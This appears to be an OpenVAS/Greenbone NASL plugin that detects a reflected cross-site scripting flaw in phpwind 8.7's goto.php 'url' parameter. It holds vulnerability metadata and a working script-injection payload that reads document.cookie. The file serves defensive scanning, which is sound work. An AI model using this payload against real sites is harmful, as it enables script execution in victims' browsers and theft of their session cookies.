if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805192" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-05-28 14:35:27 +0530 (Thu, 28 May 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "phpwind Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "The host is running phpwind and is prone
  to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to insufficient sanitization
  of user-supplied data to '/goto.php' script via 'url' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to redirect to any server or create a specially crafted request that
  would execute arbitrary script code in a user's browser session within the
  trust relationship between their browser and the server." );
	script_tag( name: "affected", value: "phpwind version 8.7 and prior." );
	script_tag( name: "solution", value: "Update to version 9.0.1 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2015/May/106" );
	script_xref( name: "URL", value: "http://diebiyi.com/articles/security/phpwind-v8-7-xss" );
	script_xref( name: "URL", value: "http://securityrelated.blogspot.in/2015/05/phpwind-v87-xss.html" );
	script_xref( name: "URL", value: "https://itswift.wordpress.com/2015/05/24/phpwind-v8-7-xss" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.phpwind.net" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/phpwind", "/cms", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: dir + "/index.php", port: http_port );
	if(ContainsString( rcvRes, "Powered by phpwind" )){
		url = dir + "/goto.php?url=\"><script>alert(document.cookie)</script>";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "><script>alert\\(document\\.cookie\\)</script>" )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

